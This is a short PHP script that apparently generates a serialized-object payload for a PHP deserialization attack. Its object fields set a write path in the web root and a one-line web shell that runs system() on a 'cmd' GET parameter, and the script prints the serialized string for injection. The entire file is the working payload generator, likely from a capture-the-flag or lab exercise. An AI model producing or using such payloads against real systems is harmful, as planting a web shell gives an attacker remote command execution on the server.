<?php 

class Test
{
    protected $filepath;
    private $text;
    public $user;

    public function __construct()
    {
        $this->filepath = "/var/www/html/ok.php";
        $this->private = "<?php system(\$_GET['cmd']);?>";
        $this->user = "admin";
    }
}

$test = new Test();
var_Export(serialize($test));
?>